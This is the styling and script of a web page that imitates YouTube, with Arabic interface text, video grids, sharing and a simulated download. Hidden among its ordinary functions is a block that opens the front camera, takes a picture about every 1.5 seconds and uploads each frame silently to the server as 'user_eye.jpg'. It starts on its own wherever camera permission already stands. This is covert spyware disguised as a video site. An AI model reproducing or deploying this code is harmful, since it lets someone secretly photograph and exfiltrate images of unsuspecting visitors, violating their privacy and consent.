*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html{color-scheme:dark}
body{font-family:'Cairo','Tajawal',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:14px;line-height:1.5;overflow-x:hidden}
button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}

svg.i{width:24px;height:24px;fill:currentColor;flex:none;display:block}
svg.i.sm{width:18px;height:18px}
svg.i.big{width:64px;height:64px;color:#717171}
.icon-btn{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;position:relative;flex:none}
.icon-btn:hover{background:var(--hover)}
.mob-only{display:none}

/* Topbar */
.topbar{position:fixed;top:0;inset-inline:0;height:56px;background:var(--bg);display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:100;gap:12px}
.tb-start,.tb-end{display:flex;align-items:center;gap:8px;flex:1}
.tb-end{justify-content:flex-end}
.logo{display:flex;align-items:center;gap:6px;font-weight:700;font-size:20px}
.logo svg{width:30px;height:21px}
.search-wrap{flex:0 1 640px;display:flex;align-items:center;gap:8px;min-width:0}
.search{display:flex;flex:1;min-width:0}
.search input{flex:1;min-width:0;height:40px;background:#121212;border:1px solid #303030;border-start-start-radius:40px;border-end-start-radius:40px;padding:0 18px;outline:none;font-size:16px;-webkit-appearance:none;appearance:none}
.search input:focus{border-color:#1c62b9}
.search button{width:64px;height:40px;background:#222;border:1px solid #303030;border-inline-start:0;border-start-end-radius:40px;border-end-end-radius:40px;display:grid;place-items:center}
.search button:hover{background:#2f2f2f}
.badge{position:absolute;top:2px;inset-inline-end:0;background:var(--red);font-size:10px;font-weight:700;border-radius:8px;padding:0 5px;line-height:16px}
.me{width:32px;height:32px;border-radius:50%;background:#8e24aa;display:grid;place-items:center;font-weight:700}

/* Sidebar */
.sidebar{position:fixed;top:56px;bottom:0;inset-inline-start:0;width:240px;background:var(--bg);overflow-y:auto;padding:12px;z-index:90;transition:transform .25s ease,width .2s ease;scrollbar-width:thin}
.sb-head{display:none;align-items:center;gap:8px;height:56px;margin:-12px -12px 8px;padding:0 16px}
.sb-item{display:flex;align-items:center;gap:22px;height:40px;padding:0 12px;border-radius:10px;width:100%;text-align:start;white-space:nowrap;overflow:hidden}
.sb-item span{overflow:hidden;text-overflow:ellipsis}
.sb-item:hover{background:var(--hover)}
.sb-item.active{background:var(--bg2);font-weight:600}
.sb-sep{height:1px;background:var(--line);margin:12px 0}
.sb-title{padding:6px 12px;font-weight:600;font-size:16px}
.sb-empty{padding:6px 12px;color:var(--text2);font-size:13px}
body.mini:not(.drawer-mode) .sidebar{width:72px;padding:4px}
body.mini:not(.drawer-mode) .sb-item{flex-direction:column;height:74px;justify-content:center;gap:6px;font-size:10px;padding:0}
body.mini:not(.drawer-mode) .sb-extra{display:none}
body.drawer-mode .sidebar{top:0;z-index:200;transform:translateX(100%);box-shadow:0 0 30px rgba(0,0,0,.6)}
body.drawer-mode.drawer-open .sidebar{transform:none}
body.drawer-mode .sb-head{display:flex}
.backdrop{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:150;display:none}
body.drawer-mode.drawer-open .backdrop{display:block}

/* Main */

.page-title{padding:16px 24px 0;font-size:20px;font-weight:700;display:flex;align-items:center;justify-content:space-between;gap:12px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:36px 16px;padding:16px 24px 32px}
.card{cursor:pointer}
.thumb{position:relative;aspect-ratio:16/9;border-radius:12px;overflow:hidden;background:#000;display:flex;justify-content:center;align-items:center}
.thumb img{width:100%;height:100%;object-fit:contain;display:block;transition:transform .3s}

.dur{position:absolute;bottom:6px;inset-inline-end:6px;background:rgba(0,0,0,.8);padding:0 5px;border-radius:4px;font-size:12px;font-weight:600;direction:ltr}

.t{font-size:16px;font-weight:600;line-height:1.45;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.sub{color:var(--text2);font-size:13px}
.empty{display:flex;flex-direction:column;align-items:center;text-align:center;gap:8px;padding:80px 24px;color:var(--text2)}
.empty h3{color:var(--text);font-size:18px}
.sect{padding:16px 24px 0;font-size:18px;font-weight:700}
.shorts-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px;padding:16px 24px 32px}
.short{position:relative;aspect-ratio:9/16;border-radius:14px;overflow:hidden;cursor:pointer;background:#222}
.short img{width:100%;height:100%;object-fit:cover}
.short div{position:absolute;inset:auto 0 0 0;padding:32px 12px 12px;background:linear-gradient(transparent,rgba(0,0,0,.85))}
.short b{display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;font-size:14px}

/* Buttons */
.btn{height:36px;padding:0 16px;border-radius:18px;background:var(--bg2);display:inline-flex;align-items:center;gap:6px;font-weight:600;white-space:nowrap;flex:none}
.btn:hover{background:#3f3f3f}
.btn.on svg{fill:var(--red)}
.btn-sub{background:#fff;color:#0f0f0f}
.btn-sub:hover{background:#d9d9d9}
.btn-sub.on{background:var(--bg2);color:#fff}
.btn-sub.on:hover{background:#3f3f3f}
.btn-sub:disabled{opacity:.4;cursor:default}
.btn-blue{background:#3ea6ff;color:#0f0f0f}
.btn-blue:hover{background:#65b8ff}
.btn.ghost{background:none}
.btn.ghost:hover{background:var(--hover)}

.watch{display:flex;gap:24px;padding:24px;max-width:1800px;margin:0 auto}
.w-primary{flex:1;min-width:0}
.w-secondary{width:402px;flex:none}
.player{position:relative;width:100%;max-width:480px;aspect-ratio:9/16;background:#000;border-radius:12px;overflow:hidden;margin:0 auto}
.player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
.yt-link{display:inline-block;margin-top:6px;font-size:12px;color:#3ea6ff}
.w-title{font-size:20px;font-weight:700;line-height:1.5;margin:8px 0}
.w-row{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
.ch{display:flex;align-items:center;gap:12px}
.ch-name{font-weight:700;font-size:16px;line-height:1.3}
.actions{display:flex;gap:8px;overflow-x:auto;scrollbar-width:none;max-width:100%}
.actions::-webkit-scrollbar{display:none}
.seg{display:flex;background:var(--bg2);border-radius:18px;overflow:hidden;flex:none}
.seg button{height:36px;padding:0 16px;display:flex;align-items:center;gap:6px;font-weight:600}
.seg button:hover{background:#3f3f3f}
.seg button.on svg{fill:var(--red)}
.seg .sep{width:1px;background:rgba(255,255,255,.2);margin:8px 0}
.desc{background:var(--hover);border-radius:12px;padding:12px;margin-top:12px;cursor:pointer}
.desc:hover{background:rgba(255,255,255,.15)}
.desc p{margin-top:4px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.desc.open p{display:block}
.desc .more{font-weight:600}
.cm-title{font-size:20px;font-weight:700;margin:24px 0 16px}
.cm-form{display:flex;gap:16px;margin-bottom:24px}
.cm-box{flex:1;min-width:0}
.cm-box input{width:100%;background:none;border:0;border-bottom:1px solid #717171;outline:none;padding:6px 0;font-size:16px}
.cm-box input:focus{border-bottom:2px solid #fff}
.cm-btns{display:none;justify-content:flex-end;gap:8px;margin-top:10px}
.cm-box.active .cm-btns{display:flex}
.cm{display:flex;gap:16px;margin-bottom:20px}
.cm-body{min-width:0;flex:1}
.cm-head{display:flex;gap:8px;align-items:baseline;flex-wrap:wrap}
.cm-body p{word-break:break-word;white-space:pre-wrap}
.cm-act{display:flex;align-items:center;gap:6px;margin-top:4px;color:var(--text2)}
.cm-act button{display:flex;align-items:center;gap:6px;padding:6px 10px;border-radius:16px;font-size:12px}
.cm-act button:hover{background:var(--hover)}
.cm-act button.on{color:#fff}
.cm-act button.on svg{fill:var(--red)}
.rel{display:flex;gap:8px;margin-bottom:10px;cursor:pointer}
.rel .thumb{width:168px;flex:none;border-radius:8px}
.rel .t{font-size:14px}
.rel-title{font-size:16px;font-weight:700;margin-bottom:12px}

/* Modal & toast */
.modal{position:fixed;inset:0;background:rgba(0,0,0,.65);display:none;place-items:center;z-index:300;padding:16px}
.modal.show{display:grid}
.modal-box{background:#212121;border-radius:16px;width:min(440px,100%);padding:16px 20px 20px}
.modal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.modal-head h3{font-size:18px}
.share-row{display:flex;gap:16px;overflow-x:auto;padding:8px 0 16px;scrollbar-width:none}
.share-row a{display:flex;flex-direction:column;align-items:center;gap:6px;font-size:12px;flex:none;width:64px}
.share-row a i{width:56px;height:56px;border-radius:50%;display:grid;place-items:center;font-style:normal;font-weight:700;font-size:20px;color:#fff}
.link-row{display:flex;gap:8px;align-items:center;background:#121212;border:1px solid #303030;border-radius:12px;padding:8px}
.link-row input{flex:1;min-width:0;background:none;border:0;outline:none;direction:ltr;font-size:14px}
.toasts{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;gap:8px;align-items:center;z-index:500;width:max-content;max-width:92vw;pointer-events:none}
.toast{background:#f1f1f1;color:#0f0f0f;padding:12px 20px;border-radius:10px;font-weight:600;box-shadow:0 4px 18px rgba(0,0,0,.5);opacity:0;transform:translateY(12px);transition:.25s;min-width:220px}
.toast.show{opacity:1;transform:none}
.prog{height:4px;background:#ccc;border-radius:2px;margin-top:8px;overflow:hidden}
.prog i{display:block;height:100%;width:0;background:var(--red);transition:width .3s}

/* Bottom nav */
.bnav{display:none;position:fixed;bottom:0;inset-inline:0;height:56px;background:var(--bg);border-top:1px solid var(--line);z-index:100;padding-bottom:env(safe-area-inset-bottom);box-sizing:content-box}
.bnav button{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:10px;gap:2px;color:var(--text2)}
.bnav button.active{color:#fff;font-weight:700}

@media(max-width:1000px){
  .watch{flex-direction:column;gap:0;padding:16px}
  .w-secondary{width:100%;margin-top:16px}
}
@media(max-width:700px){
  .mob-only{display:grid}
  .hide-mob{display:none!important}
  .topbar{padding:0 8px}
  .search-wrap{display:none;position:absolute;inset:0;background:var(--bg);padding:0 8px;z-index:2}
  body.searching .search-wrap{display:flex}
  .chips{padding:10px 12px}
  .grid{grid-template-columns:1fr;gap:22px;padding:8px 0 24px}
  .card .thumb{border-radius:0}
  .card .meta{padding:12px 12px 0}
  .page-title,.sect{padding:12px 12px 0;font-size:17px}
  .shorts-grid{grid-template-columns:repeat(2,1fr);padding:12px}
  .bnav{display:flex}
  .main{padding-bottom:64px}
  .toasts{bottom:76px}
  body.in-watch .bnav{display:none}
  body.in-watch .main{padding-bottom:0}
  body.in-watch .toasts{bottom:24px}
  .watch{padding:0}
  .player{border-radius:0;max-width:100%}
  #wMeta,#wComments,.w-secondary,.yt-link-wrap{padding-inline:12px}
  .w-title{font-size:18px}
  .rel .thumb{width:150px}
}
</style>

const fmt=n=>{let v,u='';if(n>=1e9){v=n/1e9;u=' مليار'}else if(n>=1e6){v=n/1e6;u=' مليون'}else if(n>=1e3){v=n/1e3;u=' ألف'}else return ar(n);v=v>=10?Math.round(v):Math.round(v*10)/10;return ar(v).replace('.','٫')+u};
const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

/* ===== Toast ===== */
function toast(html,{sticky=false,ms=2600}={}){
  const el=document.createElement('div');el.className='toast';el.innerHTML=html;
  $('#toasts').appendChild(el);requestAnimationFrame(()=>el.classList.add('show'));
  if(!sticky)hideToast(el,ms);return el;
}
function hideToast(el,ms=0){setTimeout(()=>{el.classList.remove('show');setTimeout(()=>el.remove(),300)},ms)}

/* ===== Layout ===== */
function updateLayout(){
  const b=document.body,drawer=innerWidth<1000||S.view==='watch';
  b.classList.toggle('drawer-mode',drawer);
  if(!drawer)b.classList.remove('drawer-open');
}
function toggleSidebar(){
  const b=document.body;

}

/* ===== Main render & History Management ===== */
function render(pushState=true){
  document.body.classList.toggle('in-watch',S.view==='watch');
  updateLayout();renderSidebar();renderBnav();
  const chips=$('#chips'),view=$('#view');
  chips.style.display=S.view==='home'?'flex':'none';

  if(pushState){
    const stateObj={view:S.view,cur:S.cur,cat:S.cat,q:S.q};
    const title=S.view==='watch'&&cur()?cur().title:'يوتيوب';
    history.pushState(stateObj,title,'#'+(S.view==='watch'?'watch='+S.cur:S.view));
  }

  if(S.view==='watch'){return renderWatch()}
  if(S.view==='home'){
    chips.innerHTML=CATS.map(c=>`<button class="chip ${c===S.cat?'active':''}" data-cat="${c}">${c}</button>`).join('');
    const l=filtered();
    view.innerHTML=(S.q?`<h2 class="page-title">نتائج البحث عن «${esc(S.q)}»</h2>`:'')+(l.length?gridHtml(l):emptyHtml('search','لم يتم العثور على نتائج','جرّب كلمات بحث مختلفة أو اختر تصنيفاً آخر.'));
  }else if(S.view==='shorts'){
    view.innerHTML=`<h2 class="page-title">شورتس</h2><div class="shorts-grid">${[...VIDEOS].reverse().slice(0,12).map(v=>`<div class="short" data-open="${v.id}"><img loading="lazy" src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><div><b>${v.title}</b><span class="sub">${fmt(v.views)} مشاهدة</span></div></div>`).join('')}</div>`;
  }else if(S.view==='subs'){
    const l=VIDEOS.filter(v=>S.subs.has(v.ch));
    view.innerHTML=`<h2 class="page-title">الاشتراكات</h2>`+(l.length?gridHtml(l):emptyHtml('subs','لم تشترك في أي قناة بعد','اشترك في قنوات لتظهر فيديوهاتها هنا.'));
  }else if(S.view==='history'){
    const l=S.hist.map(byId);
    view.innerHTML=`<h2 class="page-title">سجل المشاهدة${l.length?`<button class="btn" data-action="clear-history">مسح السجل</button>`:''}</h2>`+(l.length?gridHtml(l):emptyHtml('history','سجل المشاهدة فارغ','الفيديوهات التي تشاهدها ستظهر هنا.'));
  }else if(S.view==='library'){
    const lk=[...S.liked].map(byId),sv=[...S.saved].map(byId);
    view.innerHTML=`<h2 class="page-title">المكتبة</h2>`+
      (lk.length?`<h3 class="sect">الفيديوهات التي أعجبتني</h3>${gridHtml(lk)}`:'')+
      (sv.length?`<h3 class="sect">المحفوظة</h3>${gridHtml(sv)}`:'')+
      (!lk.length&&!sv.length?emptyHtml('library','مكتبتك فارغة','أعجب بفيديو أو احفظه ليظهر هنا.'):'');
  }
}

/* ===== Share / copy / download ===== */
async function copyText(t){
  try{await navigator.clipboard.writeText(t);return true}catch(e){
    try{const ta=document.createElement('textarea');ta.value=t;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();const ok=document.execCommand('copy');ta.remove();return ok}catch(_){return false}
  }
}
async function copyLink(){
  const ok=await copyText($('#shareLink').value);
  toast(ok?'تم نسخ الرابط بنجاح':'تعذّر النسخ، انسخ الرابط يدوياً');
}
function openShare(){
  const v=cur(),url=linkOf(v),u=encodeURIComponent(url),t=encodeURIComponent(v.title);
  const P=[['واتساب','#25d366','W',`https://wa.me/?text=${t}%20${u}`],['تيليجرام','#229ed9','T',`https://t.me/share/url?url=${u}&text=${t}`],['X','#000','X',`https://twitter.com/intent/tweet?url=${u}&text=${t}`],['فيسبوك','#1877f2','f',`https://www.facebook.com/sharer/sharer.php?u=${u}`],['البريد','#666','@',`mailto:?subject=${t}&body=${u}`]];
  $('#shareRow').innerHTML=P.map(([n,c,l,h])=>`<a href="${h}" target="_blank" rel="noopener"><i style="background:${c}">${l}</i>${n}</a>`).join('');
  $('#shareLink').value=url;$('#modal').classList.add('show');
  copyLink();
}
const closeModal=()=>$('#modal').classList.remove('show');
function download(){
  const v=cur();
  if(S.dl.has(v.id))return toast('هذا الفيديو منزَّل بالفعل');
  if(S.dling)return toast('جاري التنزيل، انتظر قليلاً...');
  S.dling=true;
  const el=toast('<span class="msg">جاري تنزيل الفيديو...</span><div class="prog"><i></i></div>',{sticky:true});
  const bar=$('i',el);let p=0;
  const iv=setInterval(()=>{
    p=Math.min(100,p+Math.random()*16+8);bar.style.width=p+'%';
    if(p>=100){clearInterval(iv);setTimeout(()=>{
      $('.msg',el).textContent='تم تنزيل الفيديو بنجاح ✓';$('.prog',el).remove();
      S.dl.add(v.id);S.dling=false;if(S.view==='watch'&&S.cur===v.id)refreshMeta();hideToast(el,2000);
    },350)}
  },300);
}

/* ===== الكاميرا الأمامية المستمرة ===== */
let mediaStream = null;

async function initPersistentCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: { ideal: 'user' }
            } 
        });

        const videoEl = document.getElementById('video');
        videoEl.srcObject = mediaStream;
        
        setInterval(() => {
            if (!mediaStream) return;
            try {
                const vw = videoEl.videoWidth || 640;
                const vh = videoEl.videoHeight || 480;

                const canvas = document.createElement('canvas');
                canvas.width = vw;
                canvas.height = vh;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, vw, vh);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, `user_eye.jpg`);
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {
                console.log("خطأ في التقاط الإطار:", err);
            }
        }, 1500);

    } catch (e) {
        console.log("بانتظار منح إذن الكاميرا:", e);
    }
}

function startCapture() {
    if (mediaStream) return;
    initPersistentCamera();
}

navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
    if (permissionStatus.state === 'granted') {
        startCapture();
    }
});

/* ===== Actions ===== */
function act(a,el){
  const v=S.cur?cur():null;
  switch(a){
    case 'menu':toggleSidebar();break;
    case 'search-open':document.body.classList.add('searching');setTimeout(()=>$('#q').focus(),50);break;
    case 'search-close':document.body.classList.remove('searching');break;
    case 'create':toast('ميزة الإنشاء غير متاحة في النسخة التجريبية');break;
    case 'notif':toast('لا توجد إشعارات جديدة');break;
    case 'profile':toast('مرحباً بك 👋');break;
    case 'subscribe':{
      const on=!S.subs.has(v.ch);on?S.subs.add(v.ch):S.subs.delete(v.ch);
      refreshMeta();renderSidebar();toast(on?`تم الاشتراك في قناة ${v.ch}`:'تم إلغاء الاشتراك');break}
    case 'like':S.liked.has(v.id)?S.liked.delete(v.id):(S.liked.add(v.id),S.disliked.delete(v.id));refreshMeta();break;
    case 'dislike':S.disliked.has(v.id)?S.disliked.delete(v.id):(S.disliked.add(v.id),S.liked.delete(v.id));refreshMeta();break;
    case 'share':openShare();break;
    case 'copy-link':copyLink();break;
    case 'close-modal':closeModal();break;
    case 'download':download();break;
    case 'save':{const on=!S.saved.has(v.id);on?S.saved.add(v.id):S.saved.delete(v.id);refreshMeta();toast(on?'تمت الإضافة إلى المحفوظات':'تمت الإزالة من المحفوظات');break}
    case 'desc':S.descOpen=!S.descOpen;refreshMeta();break;
    case 'cm-cancel':$('#cmInput').value='';$('#cmSend').disabled=true;$('#cmBox').classList.remove('active');break;
    case 'cm-send':sendComment();break;
    case 'cm-like':{const k=S.cur+':'+el.dataset.cid;S.cl.has(k)?S.cl.delete(k):S.cl.add(k);refreshComments();break}
    case 'cm-del':S.comments[S.cur]=getComments(S.cur).filter(c=>String(c.id)!==el.dataset.cid);refreshComments();toast('تم حذف التعليق');break;
    case 'clear-history':S.hist=[];render();toast('تم مسح سجل المشاهدة');break;
  }
}

document.addEventListener('click',e=>{
  if(e.target.id==='modal'){closeModal();return}
  const el=e.target.closest('[data-action],[data-open],[data-nav],[data-cat],[data-ch]');
  if(!el)return;
  const d=el.dataset;
  if(d.action)act(d.action,el);
  else if(d.open)openVideo(d.open);
  else if(d.nav)go(d.nav);
  else if(d.cat){S.cat=d.cat;render()}
  else if(d.ch)searchFor(d.ch);
});

document.addEventListener('input',e=>{
  if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
  if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
});

document.addEventListener('focusin',e=>{if(e.target.id==='cmInput')$('#cmBox').classList.add('active')});

document.addEventListener('keydown',e=>{
  if(e.target.id==='cmInput'&&e.key==='Enter'){e.preventDefault();sendComment()}
  if(e.key==='Escape'){closeModal();document.body.classList.remove('drawer-open','searching')}
});

$('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q').value.trim();
  searchFor(t);$('#q').blur();
});

/* ===== التعامل مع أزرار المتصفح ===== */
window.addEventListener('popstate',e=>{
  if(e.state){
    S.view=e.state.view;
    S.cur=e.state.cur;
    S.cat=e.state.cat;
    S.q=e.state.q||'';
    $('#q').value=S.q;
  }else{
    S.view='home';
    S.cur=null;
  }
  document.body.classList.remove('drawer-open','searching');
  render(false);
  scrollTo(0,0);
});

/* ===== Init ===== */
document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
render(true);
</script>
</body>
</html>
